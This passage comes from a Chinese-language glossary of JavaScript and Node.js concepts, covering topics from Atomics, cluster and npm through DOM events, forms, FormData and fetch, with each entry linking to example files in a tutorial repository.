示例：[`26_node_core/17_shared_memory_and_atomics.js`](26_node_core/17_shared_memory_and_atomics.js)

### Atomics（原子操作）

`Atomics` 是一组**保证不会被线程调度打断**的内存操作（`load`、`store`、`add`、`sub`、`exchange`、`compareExchange`、`wait`、`notify`），专为 `SharedArrayBuffer` 而设。为什么需要它：普通读写可能被拆成「读—改—写」三步，两个线程交叉执行就会丢更新（而 JS 又没有锁），`Atomics.add` 则保证这一系列动作整体完成。关键细节：`Atomics.wait`/`notify` 是线程间的等待/唤醒原语（不能在主线程用 `wait`，否则会抛错）；`Atomics` 只对整数有效，浮点数的原子操作需要绕道 `Int32Array`/`Float64Array` 组合。

也见 [SharedArrayBuffer（共享内存缓冲区）](#sharedarraybuffer共享内存缓冲区)、[Race Condition（竞态条件）](#race-condition竞态条件)。

示例：[`26_node_core/17_shared_memory_and_atomics.js`](26_node_core/17_shared_memory_and_atomics.js)

### Race Condition（竞态条件）

竞态条件指**代码的执行结果取决于多个任务被调度的先后顺序**，因而变得不可预测：同一段代码大多数时候正确，偶尔丢数据或算错。在 JS 里它有两副面孔：单线程内的**异步竞态**（并发请求回到顺序不定、`await` 交错导致「先检查后使用」失效、经典的 `read-modify-write` 丢失更新），以及共享内存下的**真并行数据竞争**（多个 worker 同时改同一块 `SharedArrayBuffer`）。对策相应也有两类：异步侧用「**单一数据源 + 队列/串行化 + 版本号或幂等**」消除交错；共享内存侧用 `Atomics` 或消息传递替代共享状态。**常见误解**：以为「JS 单线程就没有竞态」——恰恰相反，`async` 代码里的交错是最常见的竞态来源。

也见 [Atomics（原子操作）](#atomics原子操作)、[SharedArrayBuffer（共享内存缓冲区）](#sharedarraybuffer共享内存缓冲区)。

示例：[`26_node_core/17_shared_memory_and_atomics.js`](26_node_core/17_shared_memory_and_atomics.js)

### cluster（集群）

`node:cluster` 让一个 Node 程序**按 CPU 核数启动多个进程**（主进程 + N 个工作进程），共同监听同一个端口，从而真正吃满多核；主进程负责分发连接（Round-Robin 或由操作系统抢占），工作进程各自独立运行。它解决的问题与 `worker_threads` 不同：**cluster 是「多进程利用多核」，worker 是「一个进程内多线程并行」**，前者隔离性更好（一个崩溃不影响其它），后者共享内存更方便、启动更轻。关键细节：进程之间不共享内存，状态要放在外部存储（Redis、数据库）或通过 IPC 同步；现代部署更常见的是「一个容器一个进程 + 由编排系统横向扩容」，因此 cluster 更多出现在单机服务与 PM2 场景。

也见 [Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)、[Concurrency vs Parallelism（并发与并行）](#concurrency-vs-parallelism并发与并行)。

示例（对照：单进程内的多线程方案）：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### Concurrency vs Parallelism（并发与并行）

**并发**是「同时处理多件事」的能力（结构问题），**并行**是「同时执行多件事」（物理问题，需要多个计算单元）。Node 的经典卖点正是：**单线程也能高并发**——事件循环把等待时间重叠起来，一万个连接也能高效服务；但同一时刻真正在跑的 JS 只有一段，计算密集的任务不会因此变快。要并行就得引入 `worker_threads`（同进程多线程）或 `cluster`/多进程（多核），代价是通信、同步与调试复杂度上升。**常见误解**：把「异步」等同于「并行」——异步只是不阻塞，任务依然在同一个线程里排队执行。

也见 [Worker Threads & Main Thread（工作线程与主线程）](#worker-threads-main-thread工作线程与主线程)、[cluster（集群）](#cluster集群)。

示例：[`26_node_core/14_worker_threads.js`](26_node_core/14_worker_threads.js)

### node:util（parseArgs / promisify / inspect）

`node:util` 是 Node 的通用工具箱，三个最常用的函数是：**`parseArgs`** 把 `process.argv` 解析成结构化的选项对象（声明 `options` 与 `allowPositionals`，比手写解析可靠得多，且不会像第三方库那样增加依赖）；**`promisify`** 把「错误优先回调」风格的函数转成返回 Promise 的版本（`promisify(fs.readFile)`），但要求原函数遵循 `(err, value)` 约定；**`inspect`** 把任意值格式化成人可读字符串，`console.log` 内部就用它，可通过 `depth`、`colors`、`compact` 等选项控制。关键细节：`util.inspect` 与 `JSON.stringify` 不同——它能递归处理循环引用、`Map`/`Set`、`Symbol`，调试对象时更靠谱。

也见 [process.argv（命令行参数）](#processargv命令行参数)、[Callback API / Promise API / Sync API（三套 API 风格）](#callback-api-promise-api-sync-api三套-api-风格)。

示例：[`26_node_core/12_os_and_util.js`](26_node_core/12_os_and_util.js)、[`26_node_core/18_cli_args_and_signals.js`](26_node_core/18_cli_args_and_signals.js)

### CommonJS（CJS 模块系统）

CommonJS 是 Node 早期唯一支持的模块系统：用 `require()` 同步加载、`module.exports` / `exports` 导出，**加载时执行、结果被缓存**，因此多次 `require` 同一模块只跑一次。它与 ESM（ES Module）的关键差别在于：CommonJS 是**运行时解析的动态加载**（可以在 `if` 里 `require`），导出的是值的**快照/拷贝**而非实时绑定，且没有顶层 `await`。本仓库 `package.json` 设置了 `"type": "module"`，所以 `.js` 文件都是 ESM，需要写 CommonJS 时必须用 `.cjs` 扩展名。**常见误解**：以为两者能随意混用——ESM 可以 `import` CJS（拿到默认导出对象），CJS 里 `require` ESM 却有限制。

也见 模块册的 [`19_modules/11_cjs_require.cjs`](19_modules/11_cjs_require.cjs)、[`19_modules/12_esm_vs_cjs.cjs`](19_modules/12_esm_vs_cjs.cjs)。

示例：[`27_web_apis/_cjs_like_module.cjs`](27_web_apis/_cjs_like_module.cjs)

### __dirname vs import.meta.dirname（目录名变量）

`__dirname` 与 `__filename` 是 **CommonJS 注入**的变量，表示当前模块所在目录/文件的绝对路径；ESM 里没有它们（用了会报 `__dirname is not defined`），替代品是 **`import.meta.dirname`** 与 **`import.meta.filename`**（Node 20.11+ 提供）或 `import.meta.url` 配合 `fileURLToPath`。为什么重要：**相对路径是相对 `process.cwd()` 解析的**，脚本换个目录运行就会找不到文件，用基目录变量拼出绝对路径才是稳的做法。**常见误解**：以为 `__dirname` 在 ESM 里也能用——它是 CJS 包装函数的参数，模块系统一换就不存在了。

也见 [CommonJS（CJS 模块系统）](#commonjscjs-模块系统)、[node:path（路径模块与跨平台分隔符）](#nodepath路径模块与跨平台分隔符)。

示例：[`26_node_core/02_path_module.js`](26_node_core/02_path_module.js)、[`19_modules/10_import_meta.js`](19_modules/10_import_meta.js)

### npm（Node 包管理器）

npm 是 Node 的官方包管理器（同时是命令行工具、包注册表与生态的代称），负责安装、升级、卸载依赖，管理 `package.json`（声明依赖与脚本）与 `package-lock.json`（锁定精确版本，保证可复现安装）。核心概念：`dependencies`（运行时依赖）、`devDependencies`（开发期依赖）、`peerDependencies`（插件声明的宿主版本）、`scripts`（可复用的命令别名）。关键细节：`^1.2.3` 允许升级次版本、`~1.2.3` 只允许补丁版本，锁定文件才是团队间「装出同一个结果」的保障；`npm ci` 会在 CI 里严格按锁文件安装。

也见 工具链册的 [`39_tooling_and_workflow/01_package_json_guide.js`](39_tooling_and_workflow/01_package_json_guide.js)、[`39_tooling_and_workflow/07_lockfile_and_ci.js`](39_tooling_and_workflow/07_lockfile_and_ci.js)。

示例：[`29_npm_libraries/12_library_selection.js`](29_npm_libraries/12_library_selection.js)

### Global vs Local Install & npx（全局安装、本地安装与 npx）

**本地安装**（默认，`npm install pkg`）把包放进项目的 `node_modules`，只有本项目能用，`require`/`import` 才能找到它——这是绝大多数依赖的正确做法。**全局安装**（`npm install -g pkg`）把包放到系统级目录并加入 PATH，适合**命令行工具**（如 `eslint`、`typescript`），但会让不同项目被迫用同一版本，也无法在 `package.json` 里记录版本。**`npx`** 解决了这个矛盾：它可以直接运行（必要时临时下载）某个包的可执行文件，既能用本地 `node_modules/.bin` 里的版本，也能一次性试用全局没装的工具。**常见误解**：以为「全局装了就能 `import`」——全局包不在项目解析路径上，`import` 依然会失败。

也见 [npm（Node 包管理器）](#npmnode-包管理器)。

示例：[`29_npm_libraries/08_commander_cli.js`](29_npm_libraries/08_commander_cli.js)

### node:sqlite（内置 SQLite）

`node:sqlite` 是 Node 22 起内置的**实验性**模块，让 Node 零依赖拥有真正的持久化数据库能力，核心 API 是同步风格的 `DatabaseSync`：`exec`/`prepare`/`run`/`get`/`all`、事务与预处理语句。它适合示例、CLI 工具、桌面应用、单机服务这类「不需要独立数据库服务器」的场景；高并发生产环境仍更常用 `better-sqlite3` 等成熟库。关键细节：它是同步 API，因此**不要在大表上做重查询**（会卡住事件循环）；作为实验性模块应做**特性检测 + 降级**，避免在旧版本 Node 上直接崩掉。

也见 [`29_npm_libraries/15_database_and_orm.js`](29_npm_libraries/15_database_and_orm.js)、[Blocking vs Non-blocking I/O（阻塞式与非阻塞式 I/O）](#blocking-vs-non-blocking-io阻塞式与非阻塞式-io)。

### Built-in Test Runner（内置测试运行器）

Node 内置的测试运行器由 `node:test` 提供：`test()` 声明用例、`describe`/`it` 组织层级、`t.test()` 写子测试、断言用 `node:assert`（或 `assert/strict`），运行方式是 `node --test`。它最大的价值是**零依赖**——不用装 Jest/Vitest 就能写测试，也不需要额外的转译与配置，配合 `--experimental-test-coverage` 还能看覆盖率。关键细节：`test()` 支持返回 Promise 或接收 `t` 参数做异步断言，测试文件需要按 `*.test.js` 之类的命名约定被 `--test` 发现；它与 `node:assert` 的关系可以类比 Jest 与 `expect`。**常见误解**：以为「内置的就不够用」——对库与 CLI 项目而言它已足够，只有需要快照、浏览器环境或丰富 mock 时才需要第三方框架。

也见 [node:util（parseArgs / promisify / inspect）](#nodeutilparseargs-promisify-inspect)、[Exit Code（退出码）](#exit-code退出码)。

示例（在测试册中）：[`28_testing/02_node_test_runner.js`](28_testing/02_node_test_runner.js)、[`28_testing/03_assert_module.js`](28_testing/03_assert_module.js)

### node:http（HTTP 模块）

`node:http` 是 Node 自带的 HTTP 服务器与客户端实现，不依赖任何第三方库。服务端三步：`createServer((req, res) => {...})` 创建、监听 `'request'` 事件、`server.listen(port)` 启动；请求是**可读流**、响应是**可写流**，因此可以直接 `pipe` 文件内容或手动分段写入（适合 SSE、流式响应）。关键细节：`req.url` 只有路径与查询串（没有 host），需要 `new URL(req.url, 'http://' + req.headers.host)` 才能解析；`res.writeHead`/`res.setHeader` 要在写入正文前调用；框架（Express）本质就是对它的封装。另外要手动处理 `clientError`、超时与请求体大小限制，否则容易被慢连接拖住。

也见 [node:url & URLSearchParams（URL 模块与查询参数）](#nodeurl-urlsearchparamsurl-模块与查询参数)、[Stream（流）](#stream流)。

示例：[`26_node_core/15_http_server_client.js`](26_node_core/15_http_server_client.js)

## 浏览器与 Web API

### Browser Runtime（浏览器运行时）

浏览器运行时 = **JS 引擎（V8/JSC/SpiderMonkey）+ 渲染引擎（Blink/Gecko/WebKit）+ Web API**。JS 引擎只负责执行语言本身，页面渲染、网络、存储、图形全都由宿主提供；JS 通过绑定层的对象（`window`、`document`、`fetch`…）去调用它们。关键细节：**JS 主线程与渲染、样式计算、布局、绘制共享同一个线程**——一段长循环不只是「JS 慢」，而是整个页面卡住不响应，这正是「长任务」性能问题的根源。**常见误解**：以为 DOM 操作慢是因为 JS 慢——真正的原因是每次访问 DOM 都要跨语言边界进入渲染引擎。

也见 [Node.js Host Environment（Node 宿主环境）](#nodejs-host-environmentnode-宿主环境)、[Event & Event Listener（事件与事件监听器）](#event-event-listener事件与事件监听器)。

示例：[`00_hello_world/04_node_vs_browser.js`](00_hello_world/04_node_vs_browser.js)

### window（window 全局对象）

`window` 是浏览器里的全局对象（在脚本的顶层作用域中，`var` 声明的变量与函数声明都会变成它的属性），它同时扮演三个角色：**全局命名空间**、**当前标签页的窗口代理**（尺寸、滚动、`open`/`close`）与 **Web API 的入口**（`setTimeout`、`fetch`、`localStorage`、`location`、`navigator`、`document` 全是它的属性）。关键细节：`window` 有 `window.window === window` 的自引用；iframe 中的脚本访问父窗口要经过 `window.parent`/`postMessage`。**常见误解**：以为 `globalThis` 与 `window` 完全等价——在浏览器里它们指向同一对象，但 Node 里 `globalThis` 上没有 `window`。

也见 [document（document 对象）](#documentdocument-对象)、[Browser Runtime（浏览器运行时）](#browser-runtime浏览器运行时)。

示例：[`27_web_apis/01_dom_query.html`](27_web_apis/01_dom_query.html)

### document（document 对象）

`document` 是 `window.document`，代表**当前加载的 HTML 文档**，是 DOM 操作的入口：`querySelector`、`createElement`、`getElementById`、`body`/`head`/`documentElement`、`cookie`、`location`（在 document 上也有）、`title`、`readyState`。关键细节：脚本执行时机决定了元素存不存在——用 `defer`/`type="module"` 的脚本在解析完成后执行，普通 `<script>` 在写到的位置立即执行，此时后面的元素还没被解析出来，这是 `null` 报错的最常见原因。**常见误解**：以为 `document.write` 是通用写法——在页面加载完成后调用它会**清空整个文档**。

也见 [DOM（文档对象模型）](#dom文档对象模型)、[DOM Tree（DOM 树）](#dom-treedom-树)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### DOM（文档对象模型）

DOM（Document Object Model，文档对象模型）是浏览器把 HTML 解析成的一棵**对象树**：每个标签、文本、属性都是树上的一个对象（节点），JS 通过操作这些对象来改变页面。要点有三：DOM 是**语言无关的接口规范**（不只是给 JS 用）；DOM 对象是**宿主对象**，属性访问要跨语言边界，比操作普通 JS 对象昂贵；**页面是活文档**——改 DOM 会立即触发样式与布局的重算（不一定立即重绘）。**常见误解**：以为改 DOM 就等于改 HTML 源码——DOM 是内存中的树，源文件不变；用「查看源代码」看不到运行时改动，要用开发者工具的元素面板。

也见 [DOM Tree（DOM 树）](#dom-treedom-树)、[Node & Element（节点与元素）](#node-element节点与元素)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)、[`27_web_apis/01_dom_query.html`](27_web_apis/01_dom_query.html)

### DOM Tree（DOM 树）

DOM 树描述节点之间的**层级关系**：`document` 是根，`<html>` 是根元素，之下有 `<head>`/`<body>`，元素之间是父子与兄弟关系。每个节点都带一组导航属性：`parentNode`、`childNodes`（含文本节点）、`children`（只含元素）、`firstElementChild`/`lastElementChild`、`nextElementSibling`/`previousElementSibling`。关键细节：**HTML 里的空白与换行会生成文本节点**，所以 `childNodes.length` 常常比看到的标签数多，遍历元素时应该用 `children` 系列；`querySelectorAll` 返回的是**静态快照**，而 `children`/`childNodes` 是**实时集合**，会随 DOM 变化而变。

也见 [Node & Element（节点与元素）](#node-element节点与元素)、[DOM Manipulation & DocumentFragment（DOM 操作与文档片段）](#dom-manipulation-documentfragmentdom-操作与文档片段)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### Node & Element（节点与元素）

**节点（Node）**是 DOM 树的通用单位，共有十几种类型：元素节点、文本节点、注释节点、`document` 节点、`DocumentFragment` 等；**元素（Element）**是其中最常用的一类（类型码 1），代表一个标签，因此拥有 `id`/`className`/`classList`/`style`/`innerHTML`/`attributes` 这些只有元素才有的成员。关键细节：`nodeType`/`nodeName` 可以判断类型（1 = 元素、3 = 文本、8 = 注释、9 = 文档），`instanceof Element` 更直观；很多 DOM API 返回的是 Node（如 `firstChild`），在它上面调用 `classList` 会报错。**常见误解**：以为「元素」和「节点」可以互换——`document.body.childNodes[0]` 往往是空白文本节点，而不是元素。

也见 [DOM Tree（DOM 树）](#dom-treedom-树)、[DOM（文档对象模型）](#dom文档对象模型)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### Selector & querySelector / querySelectorAll（选择器与 DOM 查询）

选择器是用字符串描述「要匹配哪些元素」的语法，与 CSS 选择器完全一致：类型 `div`、类 `.card`、ID `#main`、属性 `[data-id="1"]`、伪类 `:checked`/`:nth-child(2)`、组合 `ul > li + li`、组 `h1, h2`。`document.querySelector(sel)` 返回**第一个**匹配的元素（没有则 `null`），`querySelectorAll(sel)` 返回**静态的 `NodeList`**（没有则空集合），两者都接受任意 CSS 选择器，因此不必再写复杂的遍历。关键细节：**它是从调用者开始向下搜索的**——`el.querySelector('div')` 只在 `el` 的后代里找，不包括 `el` 自己；`NodeList` 不是数组，要遍历可用 `for...of` 或 `Array.from`。

也见 [DOM Tree（DOM 树）](#dom-treedom-树)、[Event Delegation（事件委托）](#event-delegation事件委托)。

示例：[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)、[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)

### DOM Manipulation & DocumentFragment（DOM 操作与文档片段）

DOM 操作指对树的增删改：创建 `document.createElement('li')` / `createTextNode`、插入 `append`/`prepend`/`before`/`after`/`insertBefore`、替换 `replaceWith`/`replaceChildren`、删除 `remove`/`removeChild`、改属性 `setAttribute`/`classList.add`/`dataset`、改内容 `textContent`（安全、纯文本）与 `innerHTML`（会解析 HTML，**有 XSS 风险**）。**`DocumentFragment`** 是一个「不在页面上的游离容器」，可以把多个新节点先挂到它上面，最后一次插入文档。关键细节：每次插入都可能触发样式与布局重算，所以「**先离屏拼装、再一次性插入**」比循环逐个 `append` 快得多；`textContent` 应作为写文本的默认选择。

也见 [DOM（文档对象模型）](#dom文档对象模型)、[Node & Element（节点与元素）](#node-element节点与元素)。

示例：[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)、[`27_web_apis/01_dom_query.js`](27_web_apis/01_dom_query.js)

### Event & Event Listener（事件与事件监听器）

事件是浏览器通知「有事情发生了」的机制：用户点击（`click`）、键盘（`keydown`）、指针移动（`pointermove`）、资源加载（`load`）、网络请求完成（`fetch` 的 Promise 也算一种）、消息到达（`message`）……**事件监听器**是一个注册到某个元素与事件类型上的回调，用 `target.addEventListener(type, handler, options)` 登记。关键细节：第三个参数可以是 `{ once: true }`（只触发一次）、`{ capture: true }`（在捕获阶段触发）、`{ passive: true }`（承诺不调用 `preventDefault`，滚动性能更好）；**同一个函数引用重复注册会被去重**，但匿名箭头函数每次都是新的，会导致重复绑定与内存泄漏。

也见 [Event Object（事件对象）](#event-object事件对象)、[Event Flow（事件流三阶段）](#event-flow事件流三阶段)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)、[`27_web_apis/02_dom_events.html`](27_web_apis/02_dom_events.html)

### Event Object（事件对象）

事件对象是浏览器传给监听器的**第一个参数**，承载这次事件的全部信息与能力。常用成员：`type`（事件类型）、`target`（最初触发的元素，不随冒泡改变）、`currentTarget`（当前正在执行监听器的元素，即绑定者）、`eventPhase`（1 捕获 / 2 目标 / 3 冒泡）、坐标（`clientX`/`clientY`、`pageX`/`pageY`）、`timeStamp`、`isTrusted`，以及方法 `preventDefault()`、`stopPropagation()`、`stopImmediatePropagation()`。关键细节：**`target` 与 `currentTarget` 的区别是理解事件流的钥匙**——委托就靠前者判断该处理谁；另外事件对象是**复用**的（尤其是在旧实现与 React 合成事件中），需要异步使用时要用 `event.persist()` 或提前取出用到的值。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Event Delegation（事件委托）](#event-delegation事件委托)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Event Flow（事件流三阶段）

一次事件的传播分为三个阶段：**捕获阶段（capturing）**从 `window`/`document` 一路向下传到目标元素的父节点；**目标阶段（target）**在目标元素自身上执行监听器；**冒泡阶段（bubbling）**再从目标向上逐层传回 `window`。监听器默认注册在冒泡阶段，传 `{ capture: true }` 才是捕获阶段。关键细节：`dispatchEvent` 会先算出这条**传播路径**再依次执行；同一元素上同时有捕获与冒泡监听器时，捕获先于冒泡（在目标元素上的顺序按注册顺序）；事件流是**跨影子边界**可组合的（`composed` 决定能否穿出 Shadow DOM）。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Capturing（事件捕获）](#capturing事件捕获)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Bubbling（事件冒泡）

事件冒泡指事件在目标元素上处理完后，**继续沿父链向上传播**，父元素的监听器也会被触发，直至 `document`/`window`。它是事件委托的基础：把监听器挂在父容器上，就能统一处理所有子元素的同类事件。关键细节：**不是所有事件都冒泡**——`focus`/`blur`（但其委托版 `focusin`/`focusout` 会冒泡）、`mouseenter`/`mouseleave`、`load` 等不冒泡；`stopPropagation()` 可以打断冒泡，但会破坏依赖冒泡的委托逻辑。**常见误解**：以为「子元素被点了所以父元素也『算被点』」——冒泡只是事件传播，父元素的监听器触发时 `event.target` 仍然是真正被点的子元素。

也见 [Capturing（事件捕获）](#capturing事件捕获)、[Event Delegation（事件委托）](#event-delegation事件委托)、[Event Flow（事件流三阶段）](#event-flow事件流三阶段)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Capturing（事件捕获）

捕获阶段是事件流的**前半程**：事件从 `window` 向下传递到目标的父节点，途中所有在捕获阶段注册的监听器（`addEventListener(type, fn, true)` 或 `{ capture: true }`）会先被调用。它的实用价值在于**能在目标之前拦截事件**——例如在容器上捕获所有点击做全局埋点、或在事件到达目标前统一做权限/条件过滤。关键细节：捕获阶段只覆盖「目标的**祖先**」，目标元素自身的监听器在目标阶段执行（除非显式注册为捕获，此时它在目标阶段也参与，顺序仍按注册先后）；`{ once: true, capture: true }` 是常见组合。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Event Flow（事件流三阶段）](#event-flow事件流三阶段)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Event Delegation（事件委托）

事件委托利用冒泡，把**一个监听器挂在共同的父容器上**，通过 `event.target`（或 `target.closest(selector)`）判断实际点的是哪个子元素，从而避免给每个子元素单独绑定。它解决三个问题：动态新增的元素**自动生效**（无需重新绑定）、监听器数量从 N 降到 1（内存与性能都更好）、逻辑集中便于维护。关键细节：`closest` 是判断的好帮手，因为它会把「点在子元素内部」也算作命中；要注意子元素自己调用了 `stopPropagation` 时会破坏委托；还要避开不冒泡的事件（见冒泡条目）。**常见误解**：以为委托只适合列表——任何有共同祖先的重复元素都适用，包括表格行、菜单项、卡片。

也见 [Bubbling（事件冒泡）](#bubbling事件冒泡)、[Event Object（事件对象）](#event-object事件对象)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)、[`27_web_apis/09_dom_performance.js`](27_web_apis/09_dom_performance.js)

### preventDefault（阻止默认行为）

`preventDefault()` 取消**浏览器对该事件的默认动作**：点击链接不跳转、提交表单不刷新页面、右键不弹出菜单、拖放不执行默认打开、`wheel` 不滚动、键盘输入不落进输入框。它**不影响事件传播**——事件照样冒泡，父元素的监听器照样执行。关键细节：只有当事件的 `cancelable` 属性为 `true` 时才能生效，且必须**在监听器里同步调用**（`await` 之后往往已经太晚）；`dispatchEvent` 的返回值就是「是否未被取消」，可用来判断默认行为有没有被拦下。**常见误解**：把 `preventDefault` 与 `stopPropagation` 混为一谈——前者管「浏览器接下来做什么」，后者管「事件还要不要往上走」。

也见 [stopPropagation（阻止事件传播）](#stoppropagation阻止事件传播)、[Form Validation & setCustomValidity（表单校验与自定义校验消息）](#form-validation-setcustomvalidity表单校验与自定义校验消息)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)、[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)

### stopPropagation（阻止事件传播）

`stopPropagation()` 让事件**不再继续沿传播路径前进**：在冒泡阶段调用，祖先元素的监听器就不会再被触发；在捕获阶段调用，事件根本到不了目标。它的兄弟 `stopImmediatePropagation()` 更彻底——连**同一元素上注册在后面的其它监听器**也一并跳过。关键细节：它常常是「为了省事」而被滥用，副作用是**破坏事件委托**、让埋点/统计/框架的全局监听器失灵，排查起来非常痛苦。**常见误解**：以为它会阻止浏览器默认行为——它不会，那需要 `preventDefault()`；两者正交，必要时同时调用。

也见 [preventDefault（阻止默认行为）](#preventdefault阻止默认行为)、[Bubbling（事件冒泡）](#bubbling事件冒泡)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### CustomEvent（自定义事件）

`CustomEvent` 是可以用 `new CustomEvent(type, { detail, bubbles, cancelable })` 自行构造并 `dispatchEvent` 派发的事件类型，`detail` 可以携带任意（结构化克隆兼容的）数据。它让**组件与组件之间通过事件通信**而不是互相直接调用：子组件派发 `'item-selected'`，外层在容器上监听即可。关键细节：**必须显式设置 `bubbles: true`**，否则事件不会离开目标元素，父容器的委托监听收不到——这是自定义事件最常踩的坑；`detail` 里传对象时是引用（同页面内），跨上下文则会走结构化克隆。普通 `Event`（无 `detail`）适合「通知发生了一件事」，`CustomEvent` 适合「通知并带数据」。

也见 [Event & Event Listener（事件与事件监听器）](#event-event-listener事件与事件监听器)、[Publish/Subscribe（发布订阅）](#publishsubscribe发布订阅)。

示例：[`27_web_apis/02_dom_events.js`](27_web_apis/02_dom_events.js)

### Form（表单）

表单（`<form>`）是网页收集用户输入的标准方式，控件包括 `<input>`（`type` 可取 `text`/`email`/`number`/`checkbox`/`radio`/`file`/`date`…）、`<select>`、`<textarea>`、`<button>`。核心行为：提交时浏览器会**收集所有带 `name` 的控件**并按 `method`（GET 拼进查询串、POST 放进请求体）与 `action` 发送，然后**整页跳转**；因此现代做法是监听 `submit` 事件并 `preventDefault()`，改用 `fetch` 提交。关键细节：控件的值通过 `form.elements` 或 `FormData` 读取；`method="dialog"` 与 `<button type="button">` 是「不要提交」的常见写法；表单还能利用原生能力（自动填充、校验、移动端键盘类型）。

也见 [Form Validation & setCustomValidity（表单校验与自定义校验消息）](#form-validation-setcustomvalidity表单校验与自定义校验消息)、[FormData（表单数据）](#formdata表单数据)。

示例：[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)、[`27_web_apis/03_forms_and_validation.html`](27_web_apis/03_forms_and_validation.html)

### Form Validation & setCustomValidity（表单校验与自定义校验消息）

表单校验分两层：**原生校验**由 HTML 属性声明（`required`、`type="email"`、`minlength`/`maxlength`、`min`/`max`、`pattern`），浏览器在提交时自动阻止非法表单并显示提示气泡；**自定义校验**用 Constraint Validation API——`input.setCustomValidity('消息')` 设定自定义错误（传空字符串表示「合法」）、`input.checkValidity()`/`form.checkValidity()` 立即求值、`input.validity` 对象给出 `valueMissing`/`typeMismatch`/`patternMismatch`/`tooShort` 等具体原因。关键细节：设置过自定义消息后**必须在校验通过时把它清空**，否则该字段会永远非法；原生校验只是**用户体验的第一道防线**，服务端必须重复校验（前端校验可被绕过）。

也见 [Form（表单）](#form表单)、[preventDefault（阻止默认行为）](#preventdefault阻止默认行为)。

示例：[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)

### FormData（表单数据）

`FormData` 是「键 → 值」的表单数据容器，两种来源：`new FormData(formElement)` 自动抓取表单里所有带 `name` 的控件，或手动 `append`/`set`/`delete`/`get`/`has`。它的最大价值是**直接喂给 `fetch` 作为请求体**——设置好 `body: formData` 后，浏览器会自动使用 `multipart/form-data` 编码并生成 boundary，因此**文件上传几乎不需要手写编码逻辑**（`<input type="file">` 的 `File` 对象可直接 append）。关键细节：此时**不要手动设置 `Content-Type`**，否则会丢掉 boundary 导致服务端解析失败；同名键会形成多值，用 `getAll` 读取；它也是可迭代的（`for (const [k, v] of fd)`）。

也见 [File & FileReader（文件对象与文件读取器）](#file-filereader文件对象与文件读取器)、[fetch（Fetch API）](#fetchfetch-api)。

示例：[`27_web_apis/03_forms_and_validation.js`](27_web_apis/03_forms_and_validation.js)、[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)

### fetch（Fetch API）

`fetch` 是现代浏览器（与 Node 18+）提供的网络请求 API，基于 Promise，取代了 `XMLHttpRequest`。基本形态是 `const res = await fetch(url, { method, headers, body, signal })`，返回的是 `Response` 对象，还要再调用 `res.json()`/`res.text()`/`res.blob()` 才能读出正文。关键细节：**只有在网络层失败时才 reject**——HTTP 404/500 都算「成功返回」，必须自己检查 `res.ok`（`status` 在 200–299）；请求可被 `AbortController` 取消（传 `signal`）；`fetch` 受**同源策略与 CORS** 约束，且默认**不发送 Cookie**（需 `credentials: 'include'`）。**常见误解**：以为 `await fetch` 就拿到了数据——拿到的是响应头已到达的 `Response`，正文还是流。

也见 [Request & Response（请求与响应对象）](#request-response请求与响应对象)、[CORS（跨域资源共享）](#cors跨域资源共享)、[Status Code & Headers（状态码与请求/响应头）](#status-code-headers状态码与请求响应头)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)、[`27_web_apis/04_fetch_api.html`](27_web_apis/04_fetch_api.html)

### Request & Response（请求与响应对象）

`Request` 描述一次请求（URL、方法、头、体、模式、凭据策略），`Response` 描述一次响应（状态、头、体），两者都来自 Fetch 标准，且可以自由构造：`new Request(url, init)` 适合把请求配置**复用/预构造**（还能传给 Service Worker 缓存），`new Response(body, { status, headers })` 适合在 Service Worker 或测试里造出响应。关键细节：**正文是一次性流**——`res.json()` 读过之后就不能再读，需要多份时先用 `res.clone()`；`res.body` 是可读流，可用于进度或流式处理。**常见误解**：以为 `Request`/`Response` 只是类型名字——它们是真正的类，构造出来就能用在实际请求与拦截逻辑里。

也见 [fetch（Fetch API）](#fetchfetch-api)、[Blob（二进制大对象）](#blob二进制大对象)。

示例：[`27_web_apis/04_fetch_api.js`](27_web_apis/04_fetch_api.js)、[`27_web_apis/11_blob_file_formdata.js`](27_web_apis/11_blob_file_formdata.js)

### Status Code & Headers（状态码与请求/响应头）

